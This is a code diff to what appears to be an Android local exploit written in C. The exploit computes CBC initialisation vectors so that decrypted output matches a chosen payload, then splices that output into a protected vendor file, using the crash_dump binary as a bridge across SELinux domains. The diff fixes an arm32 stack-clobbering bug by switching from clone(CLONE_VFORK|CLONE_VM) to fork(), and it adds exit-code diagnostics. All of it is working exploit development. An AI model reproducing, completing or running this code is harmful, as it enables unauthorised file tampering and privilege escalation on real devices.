@@ -64,26 +64,35 @@ static void compute_iv(const uint8_t old_content[16], const uint8_t desired[16],
         iv[i] = dec[i] ^ desired[i];
 }
 
-/* vfork + exec crash_dump64 (splicehelper); dup2 write_fd onto target_fd in child.
+/* fork + exec the crash_dump bridge (splicehelper); dup2 write_fd onto target_fd.
  * Pass mode="r" for read, NULL for write-splice.
- * Returns waitpid status, or -1 if clone fails (already logged).
+ * Returns waitpid status, or -1 if fork fails (already logged).
+ *
+ * This used to be clone(CLONE_VFORK|CLONE_VM, stack=0), i.e. the child ran on the
+ * parent's own stack. On arm32 the child then clobbered the caller's frame: the
+ * file offset handed to the next call came back as garbage (0x102c2a6a instead
+ * of 0), so the bridge spliced past EOF and exited 1. Plain fork() gives the
+ * child its own address space and is equally correct.
  */
 static int spawn_crash_dump(off64_t offset, int write_fd, int target_fd, const char *mode)
 {
     char offstr[24];
     snprintf(offstr, sizeof(offstr), "%lld", (long long)offset);
-    int pid = (int)syscall(__NR_clone, SIGCHLD | CLONE_VFORK | CLONE_VM, 0, 0, 0, 0);
-    if (pid < 0) { printf("vfork failed: %s\n", strerror(errno)); return -1; }
+
+    int pid = fork();
+    if (pid < 0) { printf("fork failed: %s\n", strerror(errno)); return -1; }
     if (pid == 0) {
-        if (write_fd != target_fd && dup2(write_fd, target_fd) < 0) _exit(1);
+        if (write_fd != target_fd && dup2(write_fd, target_fd) < 0) _exit(9);
         if (mode)
-            execl(kCrashDump, "crashdump64", offstr, libcxx_ko_target, mode, NULL);
+            execl(kCrashDump, "crashdump", offstr, libcxx_ko_target, mode, NULL);
         else
-            execl(kCrashDump, "crashdump64", offstr, libcxx_ko_target, NULL);
-        _exit(1);
+            execl(kCrashDump, "crashdump", offstr, libcxx_ko_target, NULL);
+        _exit(9);
     }
     int st = 0;
     TEMP_FAILURE_RETRY(waitpid(pid, &st, 0));
+    if (!(WIFEXITED(st) && WEXITSTATUS(st) == 0))
+        printf("bridge(%s) off=%s status=0x%x\n", mode ? mode : "splice", offstr, st);
     return st;
 }
 
@@ -107,9 +116,11 @@ static int read_vendor_content(off64_t offset, uint8_t buf[16]) {
                 [1] = "open vendor file failed or read returned < 16 bytes",
                 [2] = "write to pipe returned < 16 bytes",
                 [3] = "OUT_FD is not a pipe (fd sanitized by SELinux domain transition?)",
+                [4] = "open of the vendor file failed (SELinux?)",
+                [9] = "bridge could not exec (dup2/execl failed)",
             };
             int ec = WEXITSTATUS(status);
-            const char *meaning = (ec < 4) ? exit_meanings[ec] : "unknown";
+            const char *meaning = (ec <= 4 || ec == 9) ? exit_meanings[ec] : "unknown";
             printf("read_vendor at 0x%llx got %d bytes: %s\n",
                      (long long)offset, n, meaning);
         } else if (WIFSIGNALED(status))
@@ -237,7 +248,9 @@ static int patch_file_cbc(const char *path, const char *payload, size_t len,
         compute_iv(old_content, desired, iv);
 
         if (do_one_write_cbc(pfd[0], pfd[1], sk_send, file_fd, off, iv, use_helper) < 0) {
-            printf("write #%zu at 0x%llx failed\n", i, (long long)off);
+            printf("write #%zu at 0x%08lx%08lx failed\n", i,
+                   (unsigned long)((uint64_t)off >> 32),
+                   (unsigned long)((uint64_t)off & 0xffffffffu));
             rc = -1; break;
         }
     }
